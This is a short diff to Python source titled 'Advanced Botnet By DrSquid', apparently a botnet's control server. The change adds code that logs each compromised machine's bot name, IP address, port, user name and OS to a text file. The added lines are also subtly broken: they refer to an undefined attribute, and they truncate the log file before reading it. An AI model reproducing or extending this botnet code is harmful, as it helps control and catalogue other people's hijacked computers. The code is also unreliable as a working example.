@@ -79,6 +79,8 @@ Advanced Botnet By DrSquid
         self.sqlconnected = False
         self.sending_file = False
         self.auto_ban = True
+        self.botinfofile = "botinfo.txt"
+        botinfo = open(self.botinfo,"w").close()
         self.max_connpersec = 20
         self.connpersec = 0
         self.conncount = 0
@@ -319,6 +321,10 @@ Advanced Botnet By DrSquid
         except:
             os = "Unknown"
         self.botnum += 1
+        file = open(self.botinfofile,"w")
+        file.write(open(self.botinfofile,"r").read())
+        file.write(f"\n[+] Botname: {name}\n[+] IP: {ip}\n[+] Src Port: {srcport}\n[+] User: {osuser}\n[+] OS: {os}\n[+] Conn: {conn}\n")
+        file.close()
         return [name, ip, srcport, osuser, os, conn]
     def get_filename(self, msg):
         """When there is a file trying to be provided for file transfering(etc), there might be files with names 
